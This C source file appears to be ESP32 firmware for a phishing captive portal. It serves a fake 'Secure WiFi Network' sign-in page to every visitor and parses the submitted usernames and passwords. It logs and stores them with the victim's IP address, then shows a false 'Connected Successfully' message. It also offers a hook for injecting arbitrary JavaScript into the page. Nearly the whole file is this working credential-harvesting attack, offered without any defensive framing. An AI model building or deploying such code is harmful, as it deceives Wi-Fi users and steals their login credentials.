#include "wifi_engine.h"
#include "esp_log.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "storage_manager.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

static const char *TAG = "PORTAL";

static void url_decode(char *s);

static TaskHandle_t s_portal_task = NULL;
static volatile bool s_running = false;
static int s_server_fd = -1;
static char *s_js_inject = NULL;

static const char HTML_INDEX[] =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>WiFi Login</title>"
    "<style>body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh}"
    ".card{background:#fff;border-radius:12px;padding:30px;box-shadow:0 2px 20px rgba(0,0,0,0.1);max-width:400px;width:100%}"
    "h2{text-align:center;color:#333;margin-bottom:24px}"
    "input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-size:16px}"
    "button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer}"
    "button:hover{background:#1557b0}"
    ".logo{text-align:center;margin-bottom:20px;color:#666;font-size:14px}"
    "</style></head><body>"
    "<div class='card'>"
    "<div class='logo'>Secure WiFi Network</div>"
    "<h2>Sign in to continue</h2>"
    "<form method='POST' action='/'>"
    "<input type='text' name='username' placeholder='Username or email' required>"
    "<input type='password' name='password' placeholder='Password' required>"
    "<button type='submit'>Connect</button>"
    "</form></div></body></html>";

static void serve_redirect(int fd)
{
    const char *resp =
        "HTTP/1.1 302 Found\r\n"
        "Location: http://192.168.4.1/\r\n"
        "Content-Length: 0\r\n\r\n";
    send(fd, resp, strlen(resp), 0);
}

static void serve_index(int fd)
{
    char resp[4096];
    int len = snprintf(resp, sizeof(resp),
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=utf-8\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s"
        "%s",
        HTML_INDEX, s_js_inject ? s_js_inject : "");
    send(fd, resp, len, 0);
}

static void handle_post(int fd, const char *body, const char *client_ip)
{
    char user[128] = {0}, pass[128] = {0};

    const char *u = strstr(body, "username=");
    const char *p = strstr(body, "password=");

    if (u) {
        u += 9;
        const char *end = strchr(u, '&');
        if (!end) end = body + strlen(body);
        size_t len = (end - u);
        if (len > sizeof(user) - 1) len = sizeof(user) - 1;
        strncpy(user, u, len);
        url_decode(user);
    }

    if (p) {
        p += 9;
        const char *end = strchr(p, '&');
        if (!end) end = body + strlen(body);
        size_t len = (end - p);
        if (len > sizeof(pass) - 1) len = sizeof(pass) - 1;
        strncpy(pass, p, len);
        url_decode(pass);
    }

    ESP_LOGI(TAG, "CREDENTIALS: user='%s' pass='%s' from %s", user, pass, client_ip);
    storage_log_credential("captive_portal", user, pass, client_ip);

    const char *resp =
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        "Connection: close\r\n"
        "\r\n"
        "<!DOCTYPE html><html><head><meta charset='utf-8'>"
        "<title>Connected</title>"
        "<style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f5f5f5}"
        ".card{background:#fff;padding:40px;border-radius:12px;text-align:center}"
        "h2{color:#28a745} p{color:#666}</style>"
        "</head><body><div class='card'>"
        "<h2>✓ Connected Successfully</h2>"
        "<p>You will be redirected shortly...</p>"
        "<script>setTimeout(function(){window.location='http://google.com';},2000);</script>"
        "</div></body></html>";
    send(fd, resp, strlen(resp), 0);
}

static void url_decode(char *s)
{
    char *src = s, *dst = s;
    while (*src) {
        if (*src == '+') { *dst++ = ' '; src++; }
        else if (*src == '%' && *(src+1) && *(src+2)) {
            char hex[3] = {src[1], src[2], 0};
            *dst++ = strtol(hex, NULL, 16);
            src += 3;
        } else {
            *dst++ = *src++;
        }
    }
    *dst = '\0';
}

static void handle_client(int fd)
{
    char buf[2048];
    int len = recv(fd, buf, sizeof(buf) - 1, 0);
    if (len <= 0) { close(fd); return; }
    buf[len] = '\0';

    char method[16], path[256];
    sscanf(buf, "%15s %255s", method, path);

    const char *host_start = strstr(buf, "Host: ");
    char host[128] = {0};
    if (host_start) {
        sscanf(host_start + 6, "%127s", host);
    }

    if (strcmp(method, "GET") == 0) {
        serve_index(fd);
    } else if (strcmp(method, "POST") == 0) {
        const char *body = strstr(buf, "\r\n\r\n");
        if (body) {
            body += 4;
            struct sockaddr_in peer;
            socklen_t peer_len = sizeof(peer);
            getpeername(fd, (struct sockaddr *)&peer, &peer_len);
            char client_ip[16];
            inet_ntoa_r(peer.sin_addr, client_ip, sizeof(client_ip));
            handle_post(fd, body, client_ip);
        } else {
            serve_index(fd);
        }
    } else {
        serve_index(fd);
    }

    close(fd);
}

static void portal_task(void *arg)
{
    s_server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (s_server_fd < 0) {
        ESP_LOGE(TAG, "Failed to create socket");
        s_running = false;
        vTaskDelete(NULL);
        return;
    }

    int opt = 1;
    setsockopt(s_server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(80),
        .sin_addr = { .s_addr = INADDR_ANY },
    };

    if (bind(s_server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        ESP_LOGE(TAG, "Failed to bind port 80");
        close(s_server_fd);
        s_server_fd = -1;
        s_running = false;
        vTaskDelete(NULL);
        return;
    }

    listen(s_server_fd, 5);
    ESP_LOGI(TAG, "Captive portal listening on port 80");

    while (s_running) {
        struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(s_server_fd, &readfds);

        int ret = select(s_server_fd + 1, &readfds, NULL, NULL, &tv);
        if (ret < 0) break;
        if (ret == 0) continue;

        struct sockaddr_in client_addr;
        socklen_t addr_len = sizeof(client_addr);
        int client_fd = accept(s_server_fd, (struct sockaddr *)&client_addr, &addr_len);
        if (client_fd >= 0) {
            handle_client(client_fd);
        }
    }

    close(s_server_fd);
    s_server_fd = -1;
    s_portal_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t captive_portal_start(const char *template_name)
{
    if (s_running) return ESP_OK;

    s_running = true;
    xTaskCreatePinnedToCore(portal_task, "portal", 8192, NULL, 5,
                            &s_portal_task, 0);
    return ESP_OK;
}

esp_err_t captive_portal_stop(void)
{
    s_running = false;
    if (s_server_fd >= 0) {
        close(s_server_fd);
        s_server_fd = -1;
    }
    if (s_portal_task) {
        vTaskDelay(pdMS_TO_TICKS(200));
        s_portal_task = NULL;
    }
    if (s_js_inject) {
        free(s_js_inject);
        s_js_inject = NULL;
    }
    ESP_LOGI(TAG, "Captive portal stopped");
    return ESP_OK;
}

esp_err_t captive_portal_inject_js(const char *js_snippet)
{
    if (!js_snippet) return ESP_ERR_INVALID_ARG;
    if (s_js_inject) free(s_js_inject);
    s_js_inject = strdup(js_snippet);
    return ESP_OK;
}
